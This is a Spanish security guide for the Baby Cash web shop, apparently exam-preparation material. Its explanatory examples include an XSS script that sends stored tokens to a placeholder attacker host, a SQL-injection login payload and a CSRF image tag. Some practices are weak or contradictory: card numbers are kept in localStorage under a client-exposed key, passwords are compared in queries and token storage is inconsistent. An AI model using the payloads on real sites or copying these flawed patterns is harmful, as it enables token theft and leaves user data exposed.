# SECURITY - BABY CASH

## 🛡️ ¿Por Qué Seguridad?

**Sin seguridad:**
- ❌ Robo de datos de usuarios
- ❌ Inyección de código malicioso
- ❌ Acceso no autorizado
- ❌ Pérdida de confianza

**Con seguridad:**
- ✅ Datos protegidos
- ✅ Usuarios seguros
- ✅ Cumplimiento normativo
- ✅ Confianza del cliente

---

## 🎯 Principios de Seguridad

### 1. Defense in Depth (Defensa en Profundidad)
Múltiples capas de seguridad:
- Frontend valida
- Backend valida
- Base de datos tiene constraints
- Network layer protege

### 2. Least Privilege (Mínimo Privilegio)
Usuario tiene solo permisos necesarios:
- Usuario normal: Ver productos, comprar
- Moderador: Gestionar productos
- Admin: Todo

### 3. Fail Secure (Fallar de Forma Segura)
Si algo falla, denegar acceso por defecto:
```typescript
if (!token || !isValid(token)) {
  return <Navigate to="/login" />; // Redirigir, no mostrar nada
}
```

---

## 🔐 Autenticación y Autorización

### JWT (JSON Web Tokens)

**¿Qué es JWT?**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

Header.Payload.Signature
```

**Estructura:**
```typescript
// Header
{
  "alg": "HS256", // Algoritmo
  "typ": "JWT"
}

// Payload
{
  "sub": "1234567890", // Subject (user ID)
  "email": "user@example.com",
  "role": "USER",
  "iat": 1516239022, // Issued at
  "exp": 1516242622 // Expiration
}

// Signature
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)
```

### Implementación en Baby Cash

```typescript
// src/contexts/AuthContext.tsx
import axios from 'axios';
import { jwtDecode } from 'jwt-decode';

interface JWTPayload {
  sub: string;
  email: string;
  role: string;
  exp: number;
}

export const AuthProvider = ({ children }: { children: React.ReactNode }) => {
  const [user, setUser] = useState<User | null>(null);
  const [loading, setLoading] = useState(true);

  // Verificar si token es válido
  const isTokenValid = (token: string): boolean => {
    try {
      const decoded = jwtDecode<JWTPayload>(token);
      const now = Date.now() / 1000;
      
      // Verificar si no ha expirado
      if (decoded.exp < now) {
        return false;
      }
      
      return true;
    } catch (error) {
      return false;
    }
  };

  // Login
  const login = async (email: string, password: string) => {
    try {
      const response = await axios.post('/api/auth/login', { email, password });
      const { token, ...userData } = response.data;
      
      // Verificar token
      if (!isTokenValid(token)) {
        throw new Error('Token inválido');
      }
      
      // Guardar token de forma segura
      localStorage.setItem('token', token);
      
      // Configurar token en headers
      axios.defaults.headers.common['Authorization'] = `Bearer ${token}`;
      
      setUser(userData);
      toast.success('Login exitoso');
    } catch (error) {
      toast.error('Credenciales inválidas');
      throw error;
    }
  };

  // Logout
  const logout = () => {
    localStorage.removeItem('token');
    delete axios.defaults.headers.common['Authorization'];
    setUser(null);
    toast.info('Sesión cerrada');
  };

  // Auto-refresh token
  useEffect(() => {
    const token = localStorage.getItem('token');
    
    if (token && isTokenValid(token)) {
      // Token válido, cargar usuario
      const decoded = jwtDecode<JWTPayload>(token);
      axios.defaults.headers.common['Authorization'] = `Bearer ${token}`;
      
      // Cargar datos completos del usuario
      axios.get('/api/auth/me').then(response => {
        setUser(response.data);
      }).catch(() => {
        logout(); // Token inválido en backend
      });
    } else {
      logout(); // Token expirado o inválido
    }
    
    setLoading(false);
  }, []);

  // Refresh token antes de expirar
  useEffect(() => {
    if (!user) return;
    
    const token = localStorage.getItem('token');
    if (!token) return;
    
    const decoded = jwtDecode<JWTPayload>(token);
    const expiresIn = decoded.exp * 1000 - Date.now();
    
    // Refresh 5 minutos antes de expirar
    const refreshTime = expiresIn - 5 * 60 * 1000;
    
    if (refreshTime > 0) {
      const timeout = setTimeout(() => {
        axios.post('/api/auth/refresh').then(response => {
          const newToken = response.data.token;
          localStorage.setItem('token', newToken);
          axios.defaults.headers.common['Authorization'] = `Bearer ${newToken}`;
        }).catch(() => {
          logout(); // No se pudo refrescar
        });
      }, refreshTime);
      
      return () => clearTimeout(timeout);
    }
  }, [user]);

  return (
    <AuthContext.Provider value={{ user, login, logout, loading }}>
      {children}
    </AuthContext.Provider>
  );
};
```

### Protected Routes

```typescript
// src/components/ProtectedRoute.tsx
import { Navigate } from 'react-router-dom';
import { useAuth } from '../contexts/AuthContext';

interface ProtectedRouteProps {
  children: React.ReactNode;
  requiredRole?: 'USER' | 'MODERATOR' | 'ADMIN';
}

export const ProtectedRoute = ({ children, requiredRole }: ProtectedRouteProps) => {
  const { user, loading } = useAuth();

  if (loading) {
    return <div>Loading...</div>;
  }

  // No autenticado
  if (!user) {
    return <Navigate to="/login" replace />;
  }

  // Verificar rol si es necesario
  if (requiredRole) {
    const roleHierarchy = {
      USER: 1,
      MODERATOR: 2,
      ADMIN: 3,
    };

    if (roleHierarchy[user.role] < roleHierarchy[requiredRole]) {
      return <Navigate to="/unauthorized" replace />;
    }
  }

  return <>{children}</>;
};
```

```typescript
// src/router/AppRouter.tsx
import { ProtectedRoute } from '../components/ProtectedRoute';

export const AppRouter = () => {
  return (
    <Routes>
      {/* Rutas públicas */}
      <Route path="/" element={<Home />} />
      <Route path="/productos" element={<Productos />} />
      <Route path="/login" element={<Login />} />
      
      {/* Rutas protegidas */}
      <Route
        path="/perfil"
        element={
          <ProtectedRoute>
            <Perfil />
          </ProtectedRoute>
        }
      />
      
      {/* Rutas para moderadores */}
      <Route
        path="/moderador/*"
        element={
          <ProtectedRoute requiredRole="MODERATOR">
            <ModeradorPanel />
          </ProtectedRoute>
        }
      />
      
      {/* Rutas para admins */}
      <Route
        path="/admin/*"
        element={
          <ProtectedRoute requiredRole="ADMIN">
            <AdminPanel />
          </ProtectedRoute>
        }
      />
    </Routes>
  );
};
```

---

## 🚨 XSS (Cross-Site Scripting)

### ¿Qué es XSS?

Inyectar código JavaScript malicioso en la página:

```html
<!-- Usuario malicioso escribe en comentario: -->
<script>
  // Robar token
  fetch('https://malicious.com/steal?token=' + localStorage.getItem('token'));
</script>
```

### Protección en React

**React escapa automáticamente:**
```typescript
// ✅ SEGURO - React escapa automáticamente
const username = '<script>alert("XSS")</script>';
return <div>{username}</div>;
// Resultado: &lt;script&gt;alert("XSS")&lt;/script&gt;
```

**Peligro con dangerouslySetInnerHTML:**
```typescript
// ❌ PELIGROSO
<div dangerouslySetInnerHTML={{ __html: userInput }} />
```

### Sanitización con DOMPurify

```bash
npm install dompurify
npm install -D @types/dompurify
```

```typescript
// src/components/SafeHTML.tsx
import DOMPurify from 'dompurify';

interface SafeHTMLProps {
  html: string;
  className?: string;
}

export const SafeHTML = ({ html, className }: SafeHTMLProps) => {
  // Sanitizar HTML antes de renderizar
  const cleanHTML = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'u', 'a'],
    ALLOWED_ATTR: ['href', 'target'],
  });

  return (
    <div
      className={className}
      dangerouslySetInnerHTML={{ __html: cleanHTML }}
    />
  );
};
```

```typescript
// Uso en descripción de producto
const ProductDetail = () => {
  const { product } = useProduct();
  
  return (
    <div>
      <h1>{product.name}</h1>
      {/* Descripción puede tener HTML de admin */}
      <SafeHTML html={product.description} />
    </div>
  );
};
```

---

## 🔒 CSRF (Cross-Site Request Forgery)

### ¿Qué es CSRF?

Hacer peticiones en nombre del usuario sin su consentimiento:

```html
<!-- Sitio malicioso -->
<img src="https://babycash.com/api/orders/1/cancel" />
<!-- Cancela orden si usuario está logueado -->
```

### Protección: CSRF Token

**Backend genera token:**
```java
// SecurityConfig.java
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http
        .csrf(csrf -> csrf
            .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
        );
    return http.build();
}
```

**Frontend incluye token:**
```typescript
// src/services/api.ts
import axios from 'axios';

// Interceptor para incluir CSRF token
axios.interceptors.request.use(config => {
  // Leer CSRF token de cookie
  const csrfToken = document.cookie
    .split('; ')
    .find(row => row.startsWith('XSRF-TOKEN='))
    ?.split('=')[1];
    
  if (csrfToken) {
    config.headers['X-XSRF-TOKEN'] = csrfToken;
  }
  
  return config;
});
```

**Alternativa: SameSite Cookie**
```java
// Backend
Cookie cookie = new Cookie("token", jwt);
cookie.setHttpOnly(true);
cookie.setSecure(true);
cookie.setSameSite("Strict"); // Solo enviar en mismo sitio
```

---

## 🔐 Secure Storage

### LocalStorage vs Cookies

| Característica | localStorage | Cookie (HttpOnly) |
|----------------|--------------|-------------------|
| **Accesible desde JS** | ✅ Sí | ❌ No |
| **XSS vulnerable** | ✅ Sí | ❌ No |
| **CSRF vulnerable** | ❌ No | ✅ Sí (mitigable) |
| **Tamaño** | 5-10MB | 4KB |
| **Enviado automático** | ❌ No | ✅ Sí |

### Recomendación para Baby Cash

**Tokens de sesión: HttpOnly Cookie** (más seguro)
```java
// Backend
@PostMapping("/login")
public ResponseEntity<?> login(@RequestBody LoginRequest request, HttpServletResponse response) {
    String token = generateToken(user);
    
    Cookie cookie = new Cookie("auth_token", token);
    cookie.setHttpOnly(true); // No accesible desde JavaScript
    cookie.setSecure(true); // Solo HTTPS
    cookie.setPath("/");
    cookie.setMaxAge(24 * 60 * 60); // 24 horas
    cookie.setSameSite("Strict");
    
    response.addCookie(cookie);
    
    return ResponseEntity.ok(user);
}
```

**Datos no sensibles: localStorage**
```typescript
// Preferencias del usuario (OK en localStorage)
localStorage.setItem('theme', 'dark');
localStorage.setItem('language', 'es');
```

### Encriptación de Datos Sensibles

```typescript
// src/utils/encryption.ts
import CryptoJS from 'crypto-js';

const SECRET_KEY = import.meta.env.VITE_ENCRYPTION_KEY;

export const encrypt = (data: string): string => {
  return CryptoJS.AES.encrypt(data, SECRET_KEY).toString();
};

export const decrypt = (encryptedData: string): string => {
  const bytes = CryptoJS.AES.decrypt(encryptedData, SECRET_KEY);
  return bytes.toString(CryptoJS.enc.Utf8);
};

// Uso
const cardNumber = '1234567812345678';
const encrypted = encrypt(cardNumber);
localStorage.setItem('card', encrypted); // Guardado encriptado

// Recuperar
const decrypted = decrypt(localStorage.getItem('card')!);
```

---

## ✅ Input Validation

### Frontend Validation (React Hook Form + Zod)

```typescript
// src/schemas/productSchema.ts
import { z } from 'zod';

export const productSchema = z.object({
  name: z
    .string()
    .min(3, 'Nombre debe tener al menos 3 caracteres')
    .max(100, 'Nombre muy largo')
    .regex(/^[a-zA-Z0-9\s]+$/, 'Solo letras, números y espacios'),
    
  price: z
    .number()
    .positive('Precio debe ser positivo')
    .max(1000000000, 'Precio demasiado alto'),
    
  description: z
    .string()
    .min(10, 'Descripción muy corta')
    .max(500, 'Descripción muy larga'),
    
  stock: z
    .number()
    .int('Stock debe ser entero')
    .nonnegative('Stock no puede ser negativo'),
    
  imageUrl: z
    .string()
    .url('URL de imagen inválida')
    .regex(/\.(jpg|jpeg|png|webp)$/i, 'Formato de imagen inválido'),
});

export type ProductFormData = z.infer<typeof productSchema>;
```

```typescript
// src/components/ProductForm.tsx
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { productSchema, ProductFormData } from '../schemas/productSchema';

export const ProductForm = () => {
  const { register, handleSubmit, formState: { errors } } = useForm<ProductFormData>({
    resolver: zodResolver(productSchema),
  });

  const onSubmit = (data: ProductFormData) => {
    // Data ya está validada
    console.log(data);
  };

  return (
    <form onSubmit={handleSubmit(onSubmit)}>
      <input {...register('name')} />
      {errors.name && <p className="error">{errors.name.message}</p>}
      
      <input type="number" {...register('price', { valueAsNumber: true })} />
      {errors.price && <p className="error">{errors.price.message}</p>}
      
      <button type="submit">Guardar</button>
    </form>
  );
};
```

### Backend Validation (Spring)

```java
// ProductDTO.java
package com.babycash.dto;

import javax.validation.constraints.*;

public class ProductDTO {
    
    @NotBlank(message = "Nombre es requerido")
    @Size(min = 3, max = 100, message = "Nombre debe tener entre 3 y 100 caracteres")
    @Pattern(regexp = "^[a-zA-Z0-9\\s]+$", message = "Solo letras, números y espacios")
    private String name;
    
    @NotNull(message = "Precio es requerido")
    @Positive(message = "Precio debe ser positivo")
    @Max(value = 1000000000, message = "Precio demasiado alto")
    private Double price;
    
    @NotBlank(message = "Descripción es requerida")
    @Size(min = 10, max = 500)
    private String description;
    
    @NotNull
    @Min(value = 0, message = "Stock no puede ser negativo")
    private Integer stock;
    
    @URL(message = "URL de imagen inválida")
    @Pattern(regexp = ".*\\.(jpg|jpeg|png|webp)$", flags = Pattern.Flag.CASE_INSENSITIVE)
    private String imageUrl;
    
    // Getters, setters...
}
```

```java
// ProductController.java
@PostMapping
public ResponseEntity<?> createProduct(@Valid @RequestBody ProductDTO productDTO) {
    // @Valid automáticamente valida
    Product product = productService.createProduct(productDTO);
    return ResponseEntity.ok(product);
}

// GlobalExceptionHandler.java
@ControllerAdvice
public class GlobalExceptionHandler {
    
    @ExceptionHandler(MethodArgumentNotValidException.class)
    public ResponseEntity<?> handleValidationErrors(MethodArgumentNotValidException ex) {
        Map<String, String> errors = new HashMap<>();
        
        ex.getBindingResult().getFieldErrors().forEach(error -> {
            errors.put(error.getField(), error.getDefaultMessage());
        });
        
        return ResponseEntity.badRequest().body(errors);
    }
}
```

---

## 🔍 SQL Injection Protection

### ❌ Vulnerable (Concatenación)

```java
// NUNCA HACER ESTO
String query = "SELECT * FROM users WHERE email = '" + email + "' AND password = '" + password + "'";
```

**Ataque:**
```
email: admin@example.com
password: ' OR '1'='1
Query: SELECT * FROM users WHERE email = 'admin@example.com' AND password = '' OR '1'='1'
// ¡Retorna todos los usuarios!
```

### ✅ Seguro (JPA/Prepared Statements)

```java
// UserRepository.java
@Repository
public interface UserRepository extends JpaRepository<User, Long> {
    
    // JPA Query Methods - automáticamente seguro
    Optional<User> findByEmailAndPassword(String email, String password);
    
    // JPQL - usa parámetros nombrados
    @Query("SELECT u FROM User u WHERE u.email = :email AND u.password = :password")
    Optional<User> findByCredentials(@Param("email") String email, @Param("password") String password);
}
```

**JPA automáticamente usa Prepared Statements:**
```sql
-- Backend genera:
SELECT * FROM users WHERE email = ? AND password = ?
-- Y luego setea parámetros de forma segura
```

---

## 🌐 Content Security Policy (CSP)

### ¿Qué es CSP?

Header HTTP que controla qué recursos puede cargar la página.

### Configuración

```html
<!-- index.html -->
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self' 'unsafe-inline';
  style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
  img-src 'self' data: https:;
  font-src 'self' https://fonts.gstatic.com;
  connect-src 'self' https://api.babycash.com;
">
```

**Explicación:**
- `default-src 'self'`: Por defecto, solo recursos del mismo origen
- `script-src 'self' 'unsafe-inline'`: Scripts del mismo origen + inline (React necesita)
- `img-src 'self' data: https:`: Imágenes del mismo origen, data URIs, HTTPS
- `connect-src`: APIs permitidas

### En Vite

```typescript
// vite.config.ts
import { defineConfig } from 'vite';

export default defineConfig({
  server: {
    headers: {
      'Content-Security-Policy': "default-src 'self'; script-src 'self' 'unsafe-inline';",
    },
  },
});
```

---

## 🔐 HTTPS y Secure Headers

### Forzar HTTPS

```java
// SecurityConfig.java
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http
        .requiresChannel(channel -> channel
            .anyRequest().requiresSecure() // Forzar HTTPS
        );
    return http.build();
}
```

### Security Headers

```java
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http
        .headers(headers -> headers
            .contentSecurityPolicy(csp -> csp
                .policyDirectives("default-src 'self'")
            )
            .xssProtection(xss -> xss.headerValue(XXssProtectionHeaderWriter.HeaderValue.ENABLED_MODE_BLOCK))
            .contentTypeOptions(Customizer.withDefaults())
            .frameOptions(frame -> frame.deny())
        );
    return http.build();
}
```

**Headers generados:**
```
Content-Security-Policy: default-src 'self'
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
```

---

## 🚀 Rate Limiting

### Prevenir Brute Force

```typescript
// src/utils/rateLimit.ts
const loginAttempts = new Map<string, { count: number; resetTime: number }>();

export const checkRateLimit = (email: string): boolean => {
  const now = Date.now();
  const attempt = loginAttempts.get(email);

  if (!attempt) {
    loginAttempts.set(email, { count: 1, resetTime: now + 15 * 60 * 1000 }); // 15 minutos
    return true;
  }

  // Reset después de 15 minutos
  if (now > attempt.resetTime) {
    loginAttempts.set(email, { count: 1, resetTime: now + 15 * 60 * 1000 });
    return true;
  }

  // Máximo 5 intentos
  if (attempt.count >= 5) {
    return false; // Bloqueado
  }

  attempt.count++;
  return true;
};
```

```typescript
// En login
const handleLogin = async (email: string, password: string) => {
  if (!checkRateLimit(email)) {
    toast.error('Demasiados intentos. Espera 15 minutos.');
    return;
  }

  try {
    await login(email, password);
  } catch (error) {
    toast.error('Credenciales inválidas');
  }
};
```

### Backend Rate Limiting

```java
// RateLimitFilter.java
@Component
public class RateLimitFilter extends OncePerRequestFilter {
    
    private final Map<String, Integer> requestCounts = new ConcurrentHashMap<>();
    private final int MAX_REQUESTS = 100;
    private final long TIME_WINDOW = 60 * 1000; // 1 minuto

    @Override
    protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain) {
        String clientIP = request.getRemoteAddr();
        
        int requests = requestCounts.getOrDefault(clientIP, 0);
        
        if (requests >= MAX_REQUESTS) {
            response.setStatus(429); // Too Many Requests
            return;
        }
        
        requestCounts.put(clientIP, requests + 1);
        
        // Reset después de 1 minuto
        new Timer().schedule(new TimerTask() {
            @Override
            public void run() {
                requestCounts.remove(clientIP);
            }
        }, TIME_WINDOW);
        
        filterChain.doFilter(request, response);
    }
}
```

---

## 🎓 Para la Evaluación del SENA

**1. "¿Qué es XSS?"**

> "Cross-Site Scripting. Inyectar código JavaScript malicioso:
> 
> ```html
> <script>
>   fetch('malicious.com?token=' + localStorage.getItem('token'));
> </script>
> ```
> 
> **Protección:**
> - React escapa automáticamente
> - Sanitizar HTML con DOMPurify
> - Nunca usar `dangerouslySetInnerHTML` sin sanitizar
> 
> Baby Cash: React + DOMPurify."

---

**2. "¿Cómo funciona JWT?"**

> "JSON Web Token. Formato: `Header.Payload.Signature`
> 
> **Proceso:**
> 1. Login → Backend genera JWT
> 2. Frontend guarda token
> 3. Cada request incluye: `Authorization: Bearer <token>`
> 4. Backend verifica firma
> 
> **Ventajas:**
> - Sin estado (stateless)
> - Escalable
> - Puede guardar datos (email, rol)
> 
> Baby Cash: JWT con refresh automático 5 min antes de expirar."

---

**3. "¿Qué es CSRF?"**

> "Cross-Site Request Forgery. Hacer peticiones en nombre del usuario:
> 
> ```html
> <img src='babycash.com/api/orders/1/cancel' />
> ```
> 
> **Protección:**
> - CSRF token único por sesión
> - SameSite cookies
> - Verificar Origin/Referer headers
> 
> Baby Cash: CSRF token en todas las peticiones POST/PUT/DELETE."

---

## 🔐 Checklist de Seguridad

- [x] **Autenticación:** JWT con refresh automático
- [x] **Autorización:** ProtectedRoute con roles
- [x] **XSS:** React + DOMPurify
- [x] **CSRF:** CSRF tokens + SameSite cookies
- [x] **SQL Injection:** JPA (no concatenación)
- [x] **Secure Storage:** HttpOnly cookies para tokens
- [x] **Input Validation:** Frontend (Zod) + Backend (javax.validation)
- [x] **HTTPS:** Forzado en producción
- [x] **Security Headers:** CSP, X-XSS-Protection, etc.
- [x] **Rate Limiting:** Prevenir brute force
- [x] **Password Hashing:** BCrypt (nunca plaintext)
- [x] **Sensitive Data:** Encriptación AES

---

## 🚀 Conclusión

**Baby Cash implementa:**
- ✅ Autenticación segura (JWT)
- ✅ Autorización por roles
- ✅ Protección XSS, CSRF, SQL Injection
- ✅ Almacenamiento seguro
- ✅ Validación completa (frontend + backend)
- ✅ Security headers y HTTPS

**Resultado: Aplicación segura y confiable.**

---

**Felicidades! Completaste el módulo avanzado de Frontend.** 🎉
